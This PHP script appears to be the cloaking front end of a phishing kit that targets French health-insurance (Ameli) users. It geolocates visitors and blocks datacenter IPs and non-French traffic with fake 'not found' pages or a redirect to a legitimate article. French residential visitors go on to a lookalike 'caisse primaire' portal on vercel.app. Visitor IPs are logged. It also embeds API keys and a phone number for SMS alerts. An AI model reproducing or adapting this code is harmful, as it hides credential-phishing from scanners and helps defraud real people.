<?php
$URL_SCM = "v2";
$API_KEY = "7QUSKSZBGY";
$URL_CREDIT = "https://api.ip2location.com/?key=".$API_KEY."&check=1";
$clickatel_API_key = "5dXdhIezTxiPR1PwN04ipw==";
$phone_to = "33756808385";
date_default_timezone_set('GMT');
$content_url = 'https://platform.clickatell.com/messages/http/send?apiKey='.$clickatel_API_key.'&to='.$phone_to.'&content=please+add+new+apikey';

$agent= $_SERVER['HTTP_USER_AGENT'];
$TIME    = date("d-m-Y H:i:s");
function recurse_copy($src, $dst)
{
    $dir    = opendir($src);
    $result = ($dir === false ? false : true);
    if ($result !== false) {
        $result = @mkdir($dst);
        if ($result === true) {
            while (false !== ($file = readdir($dir))) {
                if (($file != '.') && ($file != '..') && $result) {
                    if (is_dir($src . '/' . $file)) {
                        $result = recurse_copy($src . '/' . $file, $dst . '/' . $file);
                    } else {
                        $result = copy($src . '/' . $file, $dst . '/' . $file);
                    }
                }
            }
            closedir($dir);
        }
    }
    return $result;
}
    function getRealIpAddr()
    {
        if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
        {
            $ip=$_SERVER['HTTP_CLIENT_IP'];
        }
        elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
        {
            $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
        }
        else
        {
            $ip=$_SERVER['REMOTE_ADDR'];
        }
        $machakil=explode(',', $ip);
        if (sizeof($machakil >1)) {
            // code...
            return $machakil[0];
        }else{
            return $ip;
        }

    }


    $ip      = getRealIpAddr();
    $ip=str_replace(' ', '', $ip);
    $credits = file_get_contents($URL_CREDIT);

    if ($credits < 50) {
      // code...
       $curl = curl_init();
        curl_setopt_array($curl, array(
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_URL => $content_url
        ));
        $result = curl_exec($curl);
        curl_close($curl);
 
         }
    $black_dos = file('blacklist.txt');
        // code...
      foreach ($black_dos as $blacklisted_ip ) {
        // code...
        $l9wada =explode("###",$blacklisted_ip);
        
        if ($ip == $l9wada[0]) {
          // code...
			$dstt="https://selectra.info/assurance/guides/mutuelle-sante/assurance-maladie/ameli?option=com_orders&xfsr=true";
			 echo"<meta http-equiv='refresh' content='1;URL=$dstt'>";
          die("The file you requested was not found on this server.");
        }
      }
        $J7      = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$ip");
        $COUNTRY = $J7->geoplugin_countryName;

          if($COUNTRY =="France"){
            $URL_API="https://api.ip2location.com/?ip=".$ip."&key=".$API_KEY."&package=WS23&format=json";
            $contents = file_get_contents($URL_API);
            $data=json_decode($contents);
            if ($data->{'usage_type'}=="DCH") {
                // code...
                $file    = fopen("blacklist.txt", "a");
                fwrite($file, $ip . "###" . $TIME . "###" . $data->{'country_name'} . '###'. $agent."\n");
                die("The requested URL was not found on this server");
            }else{

					$file    = fopen("visit.txt", "a");
					fwrite($file,$ip . "###" . $TIME . "###" . $data->{'country_name'} . '###'. $agent."\n");
					$dst = "https://portals-caisse-primaire-assure-cgibins.vercel.app";
					fclose($file);
					echo"<meta http-equiv='refresh' content='1;URL=$dst'>";
					exit;
            }


          }

          else{
			  $dst2="https://selectra.info/assurance/guides/mutuelle-sante/assurance-maladie/ameli?option=com_orders&xfsr=true";
              $file    = fopen("blacklist.txt", "a");
              fwrite($file, $ip . "###" . $TIME . "###" . $data->{'country_name'} . '###'. $agent."\n");
			  echo"<meta http-equiv='refresh' content='1;URL=$dst2'>";
              
          }



    ?>
